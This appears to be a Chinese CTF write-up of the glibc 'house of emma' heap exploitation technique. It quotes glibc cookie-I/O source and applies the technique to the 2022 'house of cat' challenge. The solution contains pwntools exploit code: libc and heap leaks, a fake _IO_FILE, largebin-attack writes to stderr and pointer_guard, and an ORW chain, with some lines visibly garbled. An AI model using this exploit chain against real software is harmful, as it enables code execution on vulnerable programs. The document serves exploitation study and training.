# house of emma
‍
‍
#### 适用范围：
>   * glibc 2.23 -- 至今
>
‍
#### 利用条件：
>   * 可以进行两次任意地址写堆地址（通常是largebin attack）
>
>   * 可以触发 IO 流操作
>
>
‍
#### 攻击方法：
>   * 劫持stderr指针为我们构造的fake_IO_FILE
>   * __pointer_chk_guard 处写入已知内容，来绕过函数指针的调用对保护
>   * 触发io流
>
‍
#### 攻击限制：
>   * 若stderr 的指针存放于 bss
> 段上，无法被我们修改，那么只能通过exit来触发FSOP，但由于我们的构造可能会导致异或内容被篡改后，exit无法正常执行，使得程序无法执行到我们构造的
> IO流
>   * 需要攻击位于TLS结构体的_pointer_chk_guard，并且远程可能需要爆破TLS偏移
>
‍
#### 源码分析：
​`vtable`​虚表中有`_IO_cookie_jumps`​结构体，在`_IO_cookie_jumps`​中包含着`_IO_cookie_read`​、`_IO_cookie_write`​等一系列函数
这些函数存在着任意函数指针的调用，但是这些函数指针的调用被`pointer_guard`​ 进行了加密
    static ssize_t
    _IO_cookie_read (FILE *fp, void *buf, ssize_t size)
    {
      struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
      cookie_read_function_t *read_cb = cfile->__io_functions.read;
    #ifdef PTR_DEMANGLE
      PTR_DEMANGLE (read_cb);
    #endif
      if (read_cb == NULL)
        return -1;
      return read_cb (cfile->__cookie, buf, size);
    }
    static ssize_t
    _IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
    {
      struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
      cookie_write_function_t *write_cb = cfile->__io_functions.write;
    #ifdef PTR_DEMANGLE
      PTR_DEMANGLE (write_cb);
    #endif
      if (write_cb == NULL)
        {
          fp->_flags |= _IO_ERR_SEEN;
          return 0;
        }
      ssize_t n = write_cb (cfile->__cookie, buf, size);
      if (n _flags |= _IO_ERR_SEEN;
      return n;
    }
    static off64_t
    _IO_cookie_seek (FILE *fp, off64_t offset, int dir)
    {
      struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
      cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
    #ifdef PTR_DEMANGLE
      PTR_DEMANGLE (seek_cb);
    #endif
      return ((seek_cb == NULL
           || (seek_cb (cfile->__cookie, &offset, dir)
               == -1)
           || offset == (off64_t) -1)
          ? _IO_pos_BAD : offset);
    }
    static int
    _IO_cookie_close (FILE *fp)
    {
      struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
      cookie_close_function_t *close_cb = cfile->__io_functions.close;
    #ifdef PTR_DEMANGLE
      PTR_DEMANGLE (close_cb);
    #endif
      if (close_cb == NULL)
        return 0;
      return close_cb (cfile->__cookie);
    }
‍
#### 例题2022挑战杯house of cat
保护全开，开了沙箱
​  
​
##### 程序分析：
限制申请大小 0x418-0x46f，限制修改次数两次并只能修改0x30字节
存在UAF漏洞，限制泄露数据最大大小为0x30字节
‍
题目除了前面的加密，本身算是一道标准的菜单题，不过我们主要是要分析这道题里house of cat手法如何利用，前面需要逆向的部分不再赘述
‍
##### **例题解法：**
>   * **首先是泄露libc基址和heap地址**
>
>   * **largebin attack攻击stderr指针和__pointer_chk_guard**
>
>   * **在 stderr 指针处写一个可控地址，在__pointer_chk_guard 处写一个已知地址**
>
>   * **再利用UAF通过unsorted bin 会与 top chunk 合并的机制来修改top_chunk大小触发IO调用**
>
>   * **进入 house of emma 的调用链，同时利用一个能够转移 rdi 到 rdx 的 gadget 为 setcontext
> 提供内容**
>
>   * **利用 setcontext+61 来执行 orw，从而获取flag**
>
>
‍
###### libc和heap地址的泄露
    add(0,0x428,b'aaa')
    add(1,0x428,b'./flag\x00')
    delete(0)
    add(15,0x448,b'./flag\x00')
    add(14,0x448,b'./flag\x00')
    show(0)
    libc_base=l64()-0x21a0d0
    li('libc_base = '+hex(libc_base))
    heap_base=u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))#-0x290
    li('heap_addr = '+hex(heap_base))
###### fake_IO_FILE和orw的模板
fake_file:
    gadget = libc_base + 0x00000000001675b0
    fake_file = b'0' * 0x78
    fake_file += p64(libc_base+0x21ba60)
    fake_file = fake_file.ljust(0xc8, b'\x00')
    fake_file += p64(io_cookie_jumps_addr+0x18)
    fake_file += p64(heap_base + 0x10e0 + 0x450)
    fake_file += p64(0)
    enc_data =((gadget^(heap_base+0x1960))>>(64-0x11))|((gadget^(heap_base+0x1960)) 290-chunk2
>
> 6c0-chunk1
>
> af0-chunk15
>
> f40-chunk14
>
> 390-chunk3
>
> 7b0-chunk13
>
> bf0-chunk12
    pl=p64(libc_base+0x21a0e0)*2+p64(heap_base)+p64(stderr-0x20)
    edit(2,pl)
​  
​
    add(11,0x458,b'lll')
​  
###### stderr已被覆盖为chunk3的地址
​  
​
chunk3储存着我们伪造的fake_file
    fake_file = b'0' * 0x78
    fake_file += p64(libc_base+0x21ba60)
    fake_file = fake_file.ljust(0xc8, b'\x00')
    fake_file += p64(io_cookie_jumps_addr+0x18)
    fake_file += p64(heap_base + 0x10e0 + 0x450)
    fake_file += p64(0)
    enc_data =((gadget^(heap_base+0x1960))>>(64-0x11))|((gadget^(heap_base+0x1960))<<0x11)
    fake_file += p64(enc_data)
刚构造后的chunk3：
​  
​
delete(3)并edit(2,pl)后的chunk3
​  
​
0x3a0-0x3b0并不影响我们fake_file的布局
‍
**未修改chunk2后add(11,0x458,b'lll')：**
​  
​
###### **pointer_guard攻击：** pointer_guard覆盖为chunk12的地址
    delete(15)
    add(10,0x450,b'rrr')
    delete(12)
​  
​
    li('pointer_guard = '+hex(pointer_guard))
    pl=p64(libc_base+0x21a0e0)*2 + p64(heap_base+0x860) + p64(pointer_guard-0x20)
    edit(15, pl)
    #main_arena+1120   main_arena+1120
    #chunk15           pointer_guard-0x20
​  
​
‍
我们要修改这里，查看__pointer_chk_guard_local发现它，但是这里又是不可写的
​  
​
查看fs_base，这里我们选择攻击的是fs+0x30偏移的这个值
将0xc87d070b4dced3ee覆盖掉
​  
​
    add(9,0x450,b'hhh')
​  
​
###### **将覆盖pointer_guard为已知的堆地址**
​  
​